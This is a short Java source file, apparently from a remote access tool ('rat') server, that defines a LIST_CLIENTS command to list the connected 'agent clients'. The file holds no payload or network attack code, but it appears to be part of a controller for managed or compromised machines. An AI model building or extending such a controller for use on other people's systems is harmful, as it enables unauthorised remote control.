package com.stoppedwumm.rat.commands;

import com.stoppedwumm.rat.App;
import com.stoppedwumm.rat.ServerShit.Handler;

public class ListClientsCommand implements ServerCommand {
    @Override
    public void execute(Handler clientHandler, App serverInstance, String[] args) {
        serverInstance.sendClientList(clientHandler.getClientId());
    }

    @Override
    public String getDescription() {
        return "Lists all currently connected agent clients (excluding yourself).";
    }

    @Override
    public String getUsage() {
        return "LIST_CLIENTS";
    }
}